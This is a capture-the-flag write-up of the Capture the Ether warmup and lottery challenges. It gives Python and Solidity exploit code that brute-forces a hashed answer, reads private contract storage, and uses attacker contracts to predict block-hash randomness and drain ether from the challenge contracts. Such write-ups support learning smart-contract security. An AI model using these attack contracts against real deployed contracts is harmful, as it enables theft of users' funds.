# Capture The Ether WRITEUP


Writeup of the different challenges of [Capture the ether](https://capturetheether.com/)

# Warmup

## 2) Call Me

Pretty simple, you just call the function `callMe()`.

## 3) Choose a nickname

Again the challenge is simple, you call the function `setNickame()` with your nickname.
2 subtilities:
- One, you need to call `setNickname()` on the CaptureTheEther contract at address `0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee` and not the address given on the left.
- Two, you need to be sure to encode your nickname correctly. The contract check the leftmost character to see if its 0 or not so you need to be sure that your nickname is save as 0xYOURNICKNAMEINHEX00000000000000000000...0 instead of 0x00000000000000000000...0YOURNICKNAMEINHEX.

# Lotteries

## 4) Guess the number

Simply call `guess()` with 42 as argument and msg.value equal to 1 ether.

## 5) Guess the secret number

We need to find which uint8 has a keccak256 hash equal to the one save in the contract. We can easily brute force the solution with a loop:
```python
for i in range(2 ** 8):
    # if the hash matches, guess the number
    if Web3.solidityKeccak(["uint8"], [i]).hex().upper() == answerHash.upper():
        contract.guess(i, {"from": account, "value": ONE})
```
Then we send the transcation like the previous challenge.

## 5) Guess the random number

We need to find the number saved during the creation of the contract. Since the variable doesn't have the `public` visibility modifer, solidity didn't create a getter `answer()`, but we can still look at the contract storage and find the number:
```python
answer = int(w3.eth.get_storage_at(contract_address, 0).hex(), base=16)
```
Then we send the transcation like the previous challenge.

## 6) Guess the new number

Similar to the previous challenges, we need to find the right number, only now, the number is generated at the same time we are trying to guess it.
```solidity
uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
```

To guess this number, we create an attack contract that will do the same calculation as the target contract and will then "guess" the correct answer. Since the calculations are done during the same transaction, they will have the same block.number and timestamp:
```solidity
uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
GuessTheNewNumber(target_contract).guess{value: msg.value}(answer);
payable(msg.sender).transfer(address(this).balance);
```
We need to slightly modify the syntax since we are using solidity version 0.8.0 so `now` becomes `block.timestamp` and `keccak(x,y)` become `keccak256(abi.encodePacked(x,y))`
Then our `attack()` function call the `guess()` function with a `msg.value` of `1 ether` and we then transfer the received ether to our EOA attacker address. We also need to make sure our attack contract has a `receive()` function to receive the ether from the target contract:
```solidity
receive() external payable {}
```


## 6) Predict the future

We need to guess a number between 0 and 9 (because of the `% 10`) and call `lockInGuess(uint8 n)`. Then with a different transaction, check wheter our guess was correct or not by calling `settle()`. The problem is, if the guess was wrong, we need to guess again and each guess cost us 1 ether:
```solidity
function lockInGuess(uint8 n) public payable {
    require(guesser == 0);
    require(msg.value == 1 ether); // need to pay 1 ether to guess

    guesser = msg.sender;
    guess = n;
    settlementBlockNumber = block.number + 1; 
}

function settle() public {
    require(msg.sender == guesser); // need to call lockInGuess() each time we settle
    require(block.number > settlementBlockNumber);// has to be a different transaction (and in a different block)

    uint8 answer = uint8(
        keccak256(block.blockhash(block.number - 1), now)
    ) % 10; // calculate the answer

    guesser = 0; //reset, so if the next line is wrong, we need to call lockInGuess() again
    if (guess == answer) {
        msg.sender.transfer(2 ether);
    }
}
```
The trick is to randomly guess a number, say 8, and then with a different transaction check whether that transaction will be in a block where the answer will be equal to our guess. If it is, we call `settle()` and win, if it's not, we simply abort the transaction, lost some gas fee, and try again.
```solidity
function attack() public returns (bool) {
    uint8 answer = uint8(
        uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    block.timestamp
                )
            )
        )
    ) % 10; // compute the answer just like the target contract will, with the same params (`block.number` and `block.timestamp`)
    require(answer == 8); // make sure our answer is correct, if not revert
    PredictTheFutureChallenge(target).settle(); // if its correct, we call settle()
    payable(msg.sender).transfer(address(this).balance);// and transfer our ether from our contract to our attacker address
}
```
Now we just need to send the same transaction where we call `attack()` until the tx goes through and we recover our ethers. We only lose some gas fee.

